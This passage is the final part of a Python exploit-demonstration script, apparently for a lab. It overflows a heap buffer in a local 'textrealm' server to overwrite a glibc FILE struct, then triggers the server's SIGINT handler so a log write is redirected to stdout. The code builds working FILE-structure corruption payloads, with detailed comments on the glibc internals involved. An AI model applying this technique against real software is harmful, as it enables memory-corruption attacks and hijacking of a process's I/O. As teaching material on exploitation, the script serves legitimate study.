    # working value. That matters because g_log_fp is never reopened
    # between connections - phase 3 just left the WHOLE struct filled
    # with 0x11, so building this payload the same way (fill-byte, or a
    # struct with mostly-zeroed fields) would leave a garbage vtable/_lock
    # in place, and fwrite()/fflush() would crash reading THOSE before
    # ever reaching the write() we're trying to demonstrate. ---
    message = b"This is an example of being able to redirect writing to somewhere else!\n"
    grave_buf_addr = parse_grave_buf_addr(out3)

    print_banner("FINAL DEMO SETUP - REDIRECTING A WRITE TO STDOUT")
    if grave_buf_addr is None:
        print("[-] Could not recover grave_buf's address from the previous "
              "gdb output - skipping the stdout-redirect demo.")
        return
    if pristine_struct is None:
        print("[-] No pristine FILE struct bytes were captured at startup - "
              "skipping the stdout-redirect demo.")
        return

    print(f"[+] grave_buf address (reused from the previous gdb dump) = "
          f"{hex(grave_buf_addr)}")
    print(f"[+] message ({len(message)} bytes), placed at the very start of "
          f"grave_buf so its address is exactly {hex(grave_buf_addr)}:")
    print(f"    {message!r}")
    print(f"[+] Starting from the PRISTINE {len(pristine_struct)}-byte FILE "
          f"struct captured before any corruption, we patch only 4 fields:")
    print(f"      fileno         = 1                          (fd 1, stdout)")
    print(f"      _IO_write_base = {hex(grave_buf_addr)}       (start of our message)")
    print(f"      _IO_write_ptr  = {hex(grave_buf_addr + len(message))}  "
          f"(= _IO_write_base + {len(message)} - a POINTER, not a byte "
          f"count: glibc computes the write length as "
          f"_IO_write_ptr - _IO_write_base, so it has to be addr+len for "
          f"that subtraction to come out to {len(message)})")
    print(f"      _IO_write_end  = {hex(grave_buf_addr + WRITE_BUFFER_ROOM)}  "
          f"(gives the buffer real room - g_log_fp has never been written "
          f"to before, so its pristine _IO_write_end is 0, which would make "
          f"glibc flush on the very FIRST write attempt it makes - that "
          f"first attempt is the server's OWN crash-log line, not our "
          f"message, so without this our bytes would just sit there and "
          f"never get flushed before the real text pushes them out)")
    print(f"    Every other field (vtable, _lock, _wide_data, ...) is left "
          f"untouched at its real, legitimate value, so fwrite()/fflush() "
          f"still runs its normal code path and actually reaches the "
          f"write() syscall instead of crashing on a corrupted vtable/_lock.")

    struct_payload = patch_struct_for_stdio_redirect(pristine_struct, grave_buf_addr, message)
    if pristine_trailing:
        # glibc allocates the FILE's lock object (pointed to by _lock) and
        # its _wide_data allocation immediately AFTER the struct on the
        # heap. Phase 1's cyclic pattern deliberately overshoots past the
        # struct's end (its safety margin for offset recovery), which
        # smashes that adjacent memory too - and since this payload would
        # otherwise stop exactly at the struct's last byte, it would never
        # get repaired. Appending these pristine trailing bytes restores
        # it, so fwrite()'s internal _IO_flockfile() doesn't block forever
        # on a corrupted lock.
        struct_payload += pristine_trailing
        print(f"[+] Also restoring {len(pristine_trailing)} pristine bytes "
              f"immediately AFTER the struct (covers _lock's and "
              f"_wide_data's target allocations, which phase 1's overshoot "
              f"corrupts and nothing else repairs - without this, "
              f"fwrite() blocks forever in futex_do_wait() on the garbage "
              f"lock instead of ever writing anything).")
    filler = message + b"A" * (offset - len(message))
    payload4 = filler + struct_payload
    fragments4, frag_count4 = fragment_payload(payload4, frag2_size)
    first_overflow_idx4 = first_overflow_index(frag_count4, frag2_size, grave_size)

    print(f"[+] payload4 = message ({len(message)} bytes) + {offset - len(message)} "
          f"filler bytes + {len(struct_payload)}-byte patched FILE struct "
          f"= {len(payload4)} bytes -> {frag_count4} fragments.")

    run_overflow_demo(
        pid, bp_line, grave_size, fragments4, frag_count4, first_overflow_idx4,
        "Here's where we overwrite the FILE struct so its next write gets redirected to stdout",
        "stdout write-redirect (FileStructure.write)",
    )

    pause_for_enter(
        "Hit Enter to trigger the write and watch it redirect to stdout - "
        "this sends SIGINT (like Ctrl+C) to the server and will end this "
        "server process..."
    )
    print_banner("TRIGGERING THE REDIRECTED WRITE")

    # Re-check the target right before signaling - a respawn between here
    # and when `pid` was first captured, or a process left ptrace-stopped
    # by the gdb attach/detach cycles above, would otherwise silently
    # explain a SIGINT that looks sent but never actually runs the
    # handler.
    current_pid = find_server_pid()
    if current_pid != pid:
        print(f"[!] pid changed since this script started (was {pid}, now "
              f"{current_pid}) - the server must have respawned. Signaling "
              f"the CURRENT pid instead; its FILE struct was never "
              f"corrupted, so the redirect below will NOT happen.")
        pid = current_pid
    state = proc_state(pid)
    print(f"[+] pid={pid} /proc state = {state!r} "
          f"({'OK, running/sleeping normally' if state in ('R', 'S') else 'NOT R/S - may not handle signals right now'})")

    print(f"[*] Sending SIGINT to pid={pid}. The server's sigint_handler calls "
          f"log_crash(), which does fwrite(line, ..., g_log_fp) followed by "
          f"fflush(g_log_fp). Because g_log_fp is now our fake FILE struct, "
          f"that call does NOT write the crash-log line it thinks it's "
          f"writing - it flushes our message out to fd 1 instead. Watch the "
          f"SERVER's OWN console/terminal (not this one) for:")
    print(f"    {message.decode().strip()!r}")

    lines_before = len(read_log_all())
    os.kill(pid, signal.SIGINT)
    time.sleep(1)

    print_banner("RESULT")
    if is_pid_alive(pid):
        print("[!] Server process is still alive 1s after SIGINT - the "
              "signal was not handled (handler should _exit(130) "
              "immediately). Check proc_state above: if it wasn't 'R'/'S', "
              "the process was likely stuck in a ptrace-stopped state left "
              "over from an earlier gdb attach/detach, so it never even "
              "saw the signal.")
    else:
        log_after = read_log_all()
        new_lines = log_after[lines_before:]
        interrupted = any("INTERRUPTED" in line for line in new_lines)
        if interrupted:
            print("[!] Server exited, but textrealm.log DID get a normal "
                  "\"INTERRUPTED server received SIGINT\" line - the "
                  "redirect did NOT take effect (fwrite/fflush wrote to "
                  "the real log file as usual). Re-check that phase 4's "
                  "overflow actually landed before this signal was sent.")
        elif new_lines:
            print("[+] Server exited and NO \"INTERRUPTED\" line was added "
                  "to textrealm.log - exactly what we'd expect if the "
                  "fwrite()/fflush() got redirected to fd 1 instead of the "
                  "real log file. New log activity instead:")
            for line in new_lines:
                print(f"    {line.rstrip()}")
        else:
            print("[?] Server exited and textrealm.log did not change at "
                  "all - the redirected write may have gone to fd 1, but "
                  "there's no log-based confirmation either way. Check the "
                  "server's own console/terminal for the message.")


if __name__ == "__main__":
    main()
